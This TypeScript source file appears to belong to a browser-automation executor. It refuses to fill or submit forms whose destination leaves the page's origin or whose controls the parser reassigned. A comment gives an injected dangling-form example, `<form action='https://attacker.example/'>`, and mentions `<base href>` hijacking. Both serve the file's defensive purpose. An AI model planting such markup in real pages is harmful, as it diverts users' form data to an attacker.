// Where a form sends the values Pateat writes into it. Injected markup can decide that: a
// dangling `<form action="https://attacker.example/">` makes the parser drop the page's own
// `<form>` start tag and take its inputs, and a `<base href>` moves every relative action.
// So before a fill writes into a form, and before a click submits one, the executor reads
// the destination as the browser's form submission would and refuses one off the page's
// origin.

/** Why a form submission may not carry the executor's values. */
export type FormRefusal = "form-off-origin" | "form-owner-detached";

/** Whether `element` submits its form when clicked: a submit button or an image input. */
export function submitsForm(
  element: Element,
): element is (HTMLButtonElement | HTMLInputElement) & { form: HTMLFormElement } {
  return (
    (element instanceof HTMLButtonElement || element instanceof HTMLInputElement) &&
    (element.type === "submit" || element.type === "image") &&
    element.form !== null
  );
}

/**
 * Whether the parser, not the markup's nesting, gave `control` its form: its form owner is
 * not its nearest ancestor `<form>`, and no `form` attribute names that form. A form
 * element left open by injected markup takes the inputs after it this way.
 */
function detachedOwner(control: HTMLButtonElement | HTMLInputElement): boolean {
  return (
    control.form !== null &&
    !control.hasAttribute("form") &&
    control.closest("form") !== control.form
  );
}

/**
 * The URL a submission of `form` goes to, as the browser resolves it: the submitter's
 * `formaction` when it has one, else the form's `action`, against the document's base URL;
 * an empty or missing value is the document's URL. The attributes are read rather than the
 * `action` and `formAction` properties: an input named `action` replaces `form.action`, and
 * `formAction` reads the document's URL when the attribute is missing.
 */
function destination(
  form: HTMLFormElement,
  submitter?: HTMLButtonElement | HTMLInputElement,
): URL | undefined {
  const value = submitter?.hasAttribute("formaction")
    ? submitter.getAttribute("formaction")
    : form.getAttribute("action");
  const { ownerDocument } = form;
  return URL.parse(value ? value : ownerDocument.URL, ownerDocument.baseURI) ?? undefined;
}

/**
 * Why `controls` may not take or submit the executor's values in `form`: the parser gave
 * one of them its form (`form-owner-detached`), or the submission, with `submitter` when a
 * click sends it, does not stay on the document's origin (`form-off-origin`): another
 * host of the same site, a `javascript:` URL and an unparsable value all count. Inputs
 * outside any form have no submission to check.
 */
export function formRefusal(
  form: HTMLFormElement | null,
  controls: readonly (HTMLButtonElement | HTMLInputElement)[],
  submitter?: HTMLButtonElement | HTMLInputElement,
): FormRefusal | undefined {
  if (!form) return undefined;
  if (controls.some(detachedOwner)) return "form-owner-detached";
  // An opaque origin reads "null" on both sides, which is no match.
  const { origin } = new URL(form.ownerDocument.URL);
  return origin !== "null" && destination(form, submitter)?.origin === origin
    ? undefined
    : "form-off-origin";
}
